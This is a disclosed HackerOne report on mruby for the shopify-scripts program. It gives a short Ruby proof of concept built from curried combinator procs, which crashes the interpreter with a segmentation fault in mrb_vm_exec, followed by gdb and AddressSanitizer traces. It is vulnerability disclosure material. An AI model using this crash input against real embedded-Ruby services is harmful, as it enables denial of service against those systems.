# SIGSEGV in mrb_vm_exec

## Report Details
- **Report ID**: 214845
- **URL**: https://hackerone.com/reports/214845
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2017-03-20T10:27:37.175Z
- **Disclosed**: 2017-05-13T21:30:42.349Z

## Reporter
- **Username**: ston3
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
-------------------

The following code triggers the bug (attached as test_mrb_vm_exec.rb):

	s=proc{|f,g,x|f[x][g[x]]}.curry
	k=proc{|x,y|x}.curry
	i=proc{|x|x}.curry
	fi0=[]
	re0=proc{|x|fi0.size;x}.curry
	[s[s[i][i]][k[i]]][0][s[s[k[s]][s[k[s]][s[s[k[s]][s[k[s[k[re0]]]][s[k[s]][k]]]][k]]]][k[s[k[s]][k]]]]

Debug - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mirb
	Reading symbols from ./mirb...done.
	(gdb) r test_mrb_vm_exec.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mirb test_mrb_vm_exec.rb
	mirb - Embeddable Interactive Ruby Shell

	 => #<Proc:0x6b2290@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>
	 => #<Proc:0x6b2080@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>
	 => #<Proc:0x6b1e70@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>
	 => []
	 => #<Proc:0x6b1660@/home/x/Desktop/test/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>

	Program received signal SIGSEGV, Segmentation fault.
	0x0000000000407731 in mrb_vm_exec (mrb=0x6b0010, proc=0x844e00, pc=0x6af540 <call_iseq>) at /home/x/Desktop/test/mruby/src/vm.c:1361
	1361	          regs[0] = m->env->stack[0];
	(gdb) info reg
	rax            0x3	3
	rbx            0x7ffff7fa2400	140737353753600
	rcx            0x7ffff7fa23c0	140737353753536
	rdx            0xffffffffffffffff	-1
	rsi            0x4	4
	rdi            0x7ffff7fa23f0	140737353753584
	rbp            0x7fffffffc930	0x7fffffffc930
	rsp            0x7fffffffc360	0x7fffffffc360
	r8             0x3	3
	r9             0x7ffff7acd7b8	140737348687800
	r10            0x1	1
	r11            0x246	582
	r12            0x401ca0	4201632
	r13            0x7fffffffdf30	140737488346928
	r14            0x0	0
	r15            0x0	0
	rip            0x407731	0x407731 <mrb_vm_exec+8963>
	eflags         0x10202	[ IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	1356	        }
	1357	        else {
	1358	          stack_extend(mrb, irep->nregs, ci->argc+2);
	1359	        }
	1360	        if(m->env) {
	1361	          regs[0] = m->env->stack[0];
	1362	        }
	1363	        pc = irep->iseq;
	1364	        JUMP;
	1365	      }
	(gdb) x/x $rax
	0x3:	Cannot access memory at address 0x3

Backtrace - mirb
-------------------

	(gdb) bt
	#0  0x0000000000407731 in mrb_vm_exec (mrb=0x6b0010, proc=0x844e00, pc=0x6af540 <call_iseq>) at /home/x/Desktop/test/mruby/src/vm.c:1361
	#1  0x000000000040542c in mrb_vm_run (mrb=0x6b0010, proc=0x6b15a0, self=..., stack_keep=6) at /home/x/Desktop/test/mruby/src/vm.c:823
	#2  0x0000000000402b90 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549

Clang - mirb
-------------------

	x@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mirb test_mrb_vm_exec.rb 
	mirb - Embeddable Interactive Ruby Shell

	 => #<Proc:0x62f0000021a0@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>
	 => #<Proc:0x62f000001f90@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>
	 => #<Proc:0x62f000001d80@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>
	 => []
	 => #<Proc:0x62f000001570@/home/x/Desktop/test/clang/mruby/mrbgems/mruby-proc-ext/mrblib/proc.rb:30>
	ASAN:DEADLYSIGNAL
	=================================================================
	==2439==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000003 (pc 0x0000004f7e0d bp 0x7ffff413e660 sp 0x7ffff413d8d0 T0)
		#0 0x4f7e0c in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29
		#1 0x4f5bae in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10
		#2 0x4f3010 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mirb/tools/mirb/mirb.c:549:18
		#3 0x7f8014effec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#4 0x41a575 in _start (/home/x/Desktop/test/clang/mruby/bin/mirb+0x41a575)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29 in mrb_vm_exec
	==2439==ABORTING

Debug - mruby
-------------------

	x@x:~/Desktop/test/mruby/bin$ gdb -q ./mruby
	Reading symbols from ./mruby...done.
	(gdb) r test_mrb_vm_exec.rb 
	Starting program: /home/x/Desktop/test/mruby/bin/mruby test_mrb_vm_exec.rb

	Program received signal SIGSEGV, Segmentation fault.
	0x000000000044248a in mrb_vm_exec (mrb=0x6af010, proc=0x102f610, pc=0x6ae290 <call_iseq>) at /home/x/Desktop/test/mruby/src/vm.c:1361
	1361	          regs[0] = m->env->stack[0];
	(gdb) info reg
	rax            0x2	2
	rbx            0x7ffff7325290	140737340658320
	rcx            0x7ffff7325250	140737340658256
	rdx            0xffffffffffffffff	-1
	rsi            0x4	4
	rdi            0x7ffff7325280	140737340658304
	rbp            0x7fffffffdb30	0x7fffffffdb30
	rsp            0x7fffffffd560	0x7fffffffd560
	r8             0x3	3
	r9             0x46e911	4647185
	r10            0x21021	135201
	r11            0x201	513
	r12            0x401b20	4201248
	r13            0x7fffffffdf30	140737488346928
	r14            0x0	0
	r15            0x0	0
	rip            0x44248a	0x44248a <mrb_vm_exec+8963>
	eflags         0x10202	[ IF RF ]
	cs             0x33	51
	ss             0x2b	43
	ds             0x0	0
	es             0x0	0
	fs             0x0	0
	gs             0x0	0
	(gdb) l
	1356	        }
	1357	        else {
	1358	          stack_extend(mrb, irep->nregs, ci->argc+2);
	1359	        }
	1360	        if(m->env) {
	1361	          regs[0] = m->env->stack[0];
	1362	        }
	1363	        pc = irep->iseq;
	1364	        JUMP;
	1365	      }
	(gdb) x/x $rax
	0x2:	Cannot access memory at address 0x2
	
Backtrace - mruby
-------------------

	(gdb) bt
	#0  0x000000000044248a in mrb_vm_exec (mrb=0x6af010, proc=0x102f610, pc=0x6ae290 <call_iseq>) at /home/x/Desktop/test/mruby/src/vm.c:1361
	#1  0x0000000000440185 in mrb_vm_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:823
	#2  0x0000000000448587 in mrb_top_run (mrb=0x6af010, proc=0x6b13b0, self=..., stack_keep=0) at /home/x/Desktop/test/mruby/src/vm.c:2614
	#3  0x0000000000438e8d in mrb_load_exec (mrb=0x6af010, p=0x70cf10, c=0x70bb60) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5760
	#4  0x0000000000438f23 in mrb_load_file_cxt (mrb=0x6af010, f=0x70cb50, c=0x70bb60) at /home/x/Desktop/test/mruby/mrbgems/mruby-compiler/core/parse.y:5769
	#5  0x0000000000402415 in main (argc=2, argv=0x7fffffffdf38) at /home/x/Desktop/test/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227
	
Clang - mruby
-------------------

	x@x:~/Desktop/test/mruby/bin$ ASAN_SYMBOLIZER_PATH=//usr/lib/llvm-3.8/bin/llvm-symbolizer ../../clang/mruby/bin/mruby test_mrb_vm_exec.rb 
	ASAN:DEADLYSIGNAL
	=================================================================
	==2413==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000002 (pc 0x00000053d26d bp 0x7fff0300bd40 sp 0x7fff0300afb0 T0)
		#0 0x53d26c in mrb_vm_exec /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29
		#1 0x53b00e in mrb_vm_run /home/x/Desktop/test/clang/mruby/src/vm.c:823:10
		#2 0x543ad3 in mrb_top_run /home/x/Desktop/test/clang/mruby/src/vm.c:2614:12
		#3 0x52cc90 in mrb_load_exec /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5760:7
		#4 0x52ce62 in mrb_load_file_cxt /home/x/Desktop/test/clang/mruby/mrbgems/mruby-compiler/core/parse.y:5769:10
		#5 0x4f2b83 in main /home/x/Desktop/test/clang/mruby/mrbgems/mruby-bin-mruby/tools/mruby/mruby.c:227:11
		#6 0x7fe2af970ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287
		#7 0x41a4e5 in _start (/home/x/Desktop/test/clang/mruby/bin/mruby+0x41a4e5)

	AddressSanitizer can not provide additional info.
	SUMMARY: AddressSanitizer: SEGV /home/x/Desktop/test/clang/mruby/src/vm.c:1361:29 in mrb_vm_exec
	==2413==ABORTING

## Attachments
- test_mrb_vm_exec.rb
